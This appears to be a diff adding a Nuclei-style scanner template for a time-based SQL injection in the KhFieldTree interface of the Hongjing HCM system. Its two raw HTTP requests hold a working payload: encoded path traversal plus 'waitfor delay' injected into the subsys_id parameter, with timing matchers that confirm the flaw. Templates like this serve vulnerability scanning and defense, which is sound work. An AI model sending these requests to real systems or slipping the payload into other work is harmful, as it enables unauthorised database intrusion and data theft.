@@ -1,0 +1,24 @@
+id: hongjing-hcm-sql-injection
+info:
+  name: "宏景 HCM 系统 KhFieldTree 接口 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    通过时间延迟注入技术实现的SQL注入漏洞利用
+    攻击者可构造恶意 payloads 触发KhFieldTree接口的SQL语法解析异常，导致数据库敏感信息泄露风险
+    该漏洞存在于宏景HCM系统的KhFieldTree组件数据处理流程中
+  tags: 宏景
+http:
+- raw:
+  - |
+    GET /templates/attestation/%2e%2e/%2e%2e/servlet/performance/KhFieldTree?pointsetid=-1&subsys_id=11'waitfor+delay+'0:0:5'+-- HTTP/1.1
+    Host: {{Hostname}}
+  - |
+    GET /templates/attestation/%2e%2e/%2e%2e/servlet/performance/KhFieldTree?pointsetid=-1&subsys_id=11'waitfor+delay+'0:0:8'+-- HTTP/1.1
+    Host: {{Hostname}}
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
